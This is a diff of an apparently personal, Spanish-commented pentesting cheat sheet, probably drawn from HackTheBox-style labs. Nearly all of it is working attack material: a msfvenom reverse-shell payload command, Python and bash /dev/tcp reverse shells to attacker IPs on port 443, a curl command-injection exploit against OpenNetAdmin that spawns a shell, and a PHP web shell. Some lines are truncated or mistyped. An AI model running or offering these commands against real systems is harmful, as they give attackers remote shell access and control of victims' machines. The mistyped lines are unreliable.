@@ -36,17 +36,17 @@ CTR+Z
 stty raw -echo;fg
 reset xterm
 #Obtener sesion tty
+export TERM=xterm
+#Si sigue habiendo algunos problemas habria que configurar la variable TERM para que sea xterm
+
 
 ---     MSFvenom        ---
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=443 -f elf > file.elf
 #Creacion de un payload
 #Necesito un listener como nc para recibir la conexion
 
-
+---	Reverse shell	---
 python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.6",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh">
-
 curl -s -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;bash -c 'bash -i >%26 /dev/tcp/10.10.14.11/443 0>%261'&xajaxargs[]=ping" http://10.10.10.171/ona/
-
 bash -c 'bash -i >& /dev/tcp/10.10.14.11/443 0>&1''
-
 <?php system($_GET["cmd"]); ?>
